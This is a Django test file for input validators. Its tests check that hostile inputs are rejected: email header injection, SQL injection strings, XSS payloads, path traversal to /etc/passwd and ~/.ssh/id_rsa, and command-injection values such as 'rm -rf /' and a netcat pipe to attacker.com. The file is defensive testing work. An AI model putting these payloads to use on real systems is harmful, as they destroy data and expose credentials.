"""
Tests for custom validators.
"""

from django.core.exceptions import ValidationError
from django.test import TestCase

from input_validation.validators import (
    AlphanumericValidator,
    ContentLengthValidator,
    NoCommandInjectionValidator,
    NoPathTraversalValidator,
    NoSQLInjectionValidator,
    NoXSSValidator,
    PhoneNumberValidator,
    SafeURLValidator,
    StrictEmailValidator,
    UsernameValidator,
)


class StrictEmailValidatorTests(TestCase):
    """Tests for StrictEmailValidator."""

    def setUp(self):
        self.validator = StrictEmailValidator()

    def test_valid_email(self):
        """Valid emails should pass."""
        valid_emails = [
            'user@example.com',
            'test.user@example.co.uk',
            'user+tag@example.com',
            'user123@test-domain.com',
        ]

        for email in valid_emails:
            with self.subTest(email=email):
                self.validator(email)  # Should not raise

    def test_email_with_newlines(self):
        """Emails with newlines should fail."""
        invalid_emails = [
            'user@example.com\nBCC:attacker@evil.com',
            'user@example.com\r\nCC:attacker@evil.com',
            'user%0a@example.com',
        ]

        for email in invalid_emails:
            with self.subTest(email=email):
                with self.assertRaises(ValidationError):
                    self.validator(email)

    def test_email_with_multiple_at(self):
        """Emails with multiple @ symbols should fail."""
        with self.assertRaises(ValidationError):
            self.validator('user@@example.com')

    def test_email_too_long(self):
        """Emails longer than 254 characters should fail."""
        long_email = 'a' * 250 + '@example.com'
        with self.assertRaises(ValidationError):
            self.validator(long_email)

    def test_email_header_injection(self):
        """Emails with header injection attempts should fail."""
        invalid_emails = [
            'user@example.com\nBCC:evil@evil.com',
            'user@example.com\r\nContent-Type:text/html',
            'user@example.com%0dTo:evil@evil.com',
        ]

        for email in invalid_emails:
            with self.subTest(email=email):
                with self.assertRaises(ValidationError):
                    self.validator(email)


class UsernameValidatorTests(TestCase):
    """Tests for UsernameValidator."""

    def setUp(self):
        self.validator = UsernameValidator()

    def test_valid_username(self):
        """Valid usernames should pass."""
        valid_usernames = [
            'user123',
            'test_user',
            'user-name',
            'John123',
            'abc',
        ]

        for username in valid_usernames:
            with self.subTest(username=username):
                self.validator(username)  # Should not raise

    def test_username_too_short(self):
        """Usernames shorter than 3 characters should fail."""
        with self.assertRaises(ValidationError):
            self.validator('ab')

    def test_username_too_long(self):
        """Usernames longer than 30 characters should fail."""
        long_username = 'a' * 31
        with self.assertRaises(ValidationError):
            self.validator(long_username)

    def test_username_invalid_start(self):
        """Usernames not starting with a letter should fail."""
        invalid_usernames = ['123user', '_user', '-user']

        for username in invalid_usernames:
            with self.subTest(username=username):
                with self.assertRaises(ValidationError):
                    self.validator(username)

    def test_username_invalid_end(self):
        """Usernames ending with hyphen or underscore should fail."""
        invalid_usernames = ['user-', 'user_']

        for username in invalid_usernames:
            with self.subTest(username=username):
                with self.assertRaises(ValidationError):
                    self.validator(username)

    def test_username_reserved(self):
        """Reserved usernames should fail."""
        reserved_usernames = ['admin', 'root', 'administrator', 'system']

        for username in reserved_usernames:
            with self.subTest(username=username):
                with self.assertRaises(ValidationError):
                    self.validator(username)

    def test_username_invalid_characters(self):
        """Usernames with special characters should fail."""
        invalid_usernames = ['user@name', 'user.name', 'user name', 'user!']

        for username in invalid_usernames:
            with self.subTest(username=username):
                with self.assertRaises(ValidationError):
                    self.validator(username)


class NoSQLInjectionValidatorTests(TestCase):
    """Tests for NoSQLInjectionValidator."""

    def setUp(self):
        self.validator = NoSQLInjectionValidator()

    def test_safe_input(self):
        """Safe input should pass."""
        safe_inputs = [
            'normal text',
            'user@example.com',
            'Product name 123',
        ]

        for input_text in safe_inputs:
            with self.subTest(input_text=input_text):
                self.validator(input_text)  # Should not raise

    def test_sql_keywords(self):
        """Input with SQL keywords should fail."""
        malicious_inputs = [
            "'; DROP TABLE users--",
            "1' OR '1'='1",
            "admin'--",
            "SELECT * FROM users",
            "UNION SELECT password FROM users",
        ]

        for input_text in malicious_inputs:
            with self.subTest(input_text=input_text):
                with self.assertRaises(ValidationError):
                    self.validator(input_text)


class NoXSSValidatorTests(TestCase):
    """Tests for NoXSSValidator."""

    def setUp(self):
        self.validator = NoXSSValidator()

    def test_safe_input(self):
        """Safe input should pass."""
        safe_inputs = [
            'normal text',
            'Text with <3 hearts',
            'Price: $100',
        ]

        for input_text in safe_inputs:
            with self.subTest(input_text=input_text):
                self.validator(input_text)  # Should not raise

    def test_xss_attempts(self):
        """Input with XSS attempts should fail."""
        malicious_inputs = [
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '<iframe src="evil.com"></iframe>',
            '<object data="evil.swf"></object>',
        ]

        for input_text in malicious_inputs:
            with self.subTest(input_text=input_text):
                with self.assertRaises(ValidationError):
                    self.validator(input_text)


class NoCommandInjectionValidatorTests(TestCase):
    """Tests for NoCommandInjectionValidator."""

    def setUp(self):
        self.validator = NoCommandInjectionValidator()

    def test_safe_input(self):
        """Safe input should pass."""
        safe_inputs = [
            'normal text',
            'filename.txt',
            'path/to/file',
        ]

        for input_text in safe_inputs:
            with self.subTest(input_text=input_text):
                self.validator(input_text)  # Should not raise

    def test_command_injection_attempts(self):
        """Input with command injection attempts should fail."""
        malicious_inputs = [
            'file.txt; rm -rf /',
            'file.txt && cat /etc/passwd',
            'file.txt | nc attacker.com 1234',
            'file.txt `whoami`',
            'file.txt $(whoami)',
        ]

        for input_text in malicious_inputs:
            with self.subTest(input_text=input_text):
                with self.assertRaises(ValidationError):
                    self.validator(input_text)


class SafeURLValidatorTests(TestCase):
    """Tests for SafeURLValidator."""

    def setUp(self):
        self.validator = SafeURLValidator()

    def test_valid_urls(self):
        """Valid public URLs should pass."""
        valid_urls = [
            'https://example.com',
            'http://www.example.com',
            'https://example.com:8080',
            'https://sub.example.com/path',
        ]

        for url in valid_urls:
            with self.subTest(url=url):
                self.validator(url)  # Should not raise

    def test_invalid_protocols(self):
        """URLs with non-HTTP(S) protocols should fail."""
        invalid_urls = [
            'ftp://example.com',
            'file:///etc/passwd',
            'data:text/html,<script>alert("XSS")</script>',
        ]

        for url in invalid_urls:
            with self.subTest(url=url):
                with self.assertRaises(ValidationError):
                    self.validator(url)

    def test_localhost_urls(self):
        """URLs pointing to localhost should fail."""
        invalid_urls = [
            'http://localhost',
            'http://127.0.0.1',
            'http://0.0.0.0',
        ]

        for url in invalid_urls:
            with self.subTest(url=url):
                with self.assertRaises(ValidationError):
                    self.validator(url)

    def test_private_ip_urls(self):
        """URLs pointing to private IPs should fail."""
        invalid_urls = [
            'http://10.0.0.1',
            'http://172.16.0.1',
            'http://192.168.1.1',
            'http://169.254.1.1',
        ]

        for url in invalid_urls:
            with self.subTest(url=url):
                with self.assertRaises(ValidationError):
                    self.validator(url)


class PhoneNumberValidatorTests(TestCase):
    """Tests for PhoneNumberValidator."""

    def setUp(self):
        self.validator = PhoneNumberValidator()

    def test_valid_phone_numbers(self):
        """Valid phone numbers should pass."""
        valid_numbers = [
            '+12345678901',
            '+447911123456',
            '+861234567890',
        ]

        for number in valid_numbers:
            with self.subTest(number=number):
                self.validator(number)  # Should not raise

    def test_invalid_phone_numbers(self):
        """Invalid phone numbers should fail."""
        invalid_numbers = [
            '12345678901',  # Missing +
            '+0123456789',  # Starts with 0
            '+123',         # Too short
            '+1234567890123456',  # Too long
            '+1-234-567-890',  # Has dashes
            '+1 234 567 890',  # Has spaces
        ]

        for number in invalid_numbers:
            with self.subTest(number=number):
                with self.assertRaises(ValidationError):
                    self.validator(number)


class NoPathTraversalValidatorTests(TestCase):
    """Tests for NoPathTraversalValidator."""

    def setUp(self):
        self.validator = NoPathTraversalValidator()

    def test_safe_paths(self):
        """Safe paths should pass."""
        safe_paths = [
            'file.txt',
            'folder/file.txt',
            'path/to/file.txt',
        ]

        for path in safe_paths:
            with self.subTest(path=path):
                self.validator(path)  # Should not raise

    def test_path_traversal_attempts(self):
        """Paths with traversal attempts should fail."""
        malicious_paths = [
            '../file.txt',
            '../../etc/passwd',
            'folder/../../../file.txt',
            '~/.ssh/id_rsa',
            '%2e%2e/file.txt',
        ]

        for path in malicious_paths:
            with self.subTest(path=path):
                with self.assertRaises(ValidationError):
                    self.validator(path)


class ContentLengthValidatorTests(TestCase):
    """Tests for ContentLengthValidator."""

    def test_content_within_limit(self):
        """Content within limit should pass."""
        validator = ContentLengthValidator(max_length=100)
        validator('a' * 100)  # Should not raise

    def test_content_exceeds_limit(self):
        """Content exceeding limit should fail."""
        validator = ContentLengthValidator(max_length=100)

        with self.assertRaises(ValidationError):
            validator('a' * 101)


class AlphanumericValidatorTests(TestCase):
    """Tests for AlphanumericValidator."""

    def test_valid_alphanumeric(self):
        """Valid alphanumeric input should pass."""
        validator = AlphanumericValidator(allow_spaces=False)
        valid_inputs = ['abc123', 'ABC', '123', 'Test123']

        for input_text in valid_inputs:
            with self.subTest(input_text=input_text):
                validator(input_text)  # Should not raise

    def test_with_spaces_allowed(self):
        """Spaces should be allowed when configured."""
        validator = AlphanumericValidator(allow_spaces=True)
        validator('hello world 123')  # Should not raise

    def test_with_spaces_not_allowed(self):
        """Spaces should fail when not allowed."""
        validator = AlphanumericValidator(allow_spaces=False)

        with self.assertRaises(ValidationError):
            validator('hello world')

    def test_special_characters(self):
        """Special characters should fail."""
        validator = AlphanumericValidator(allow_spaces=False)
        invalid_inputs = ['test@', 'test!', 'test#', 'test$']

        for input_text in invalid_inputs:
            with self.subTest(input_text=input_text):
                with self.assertRaises(ValidationError):
                    validator(input_text)
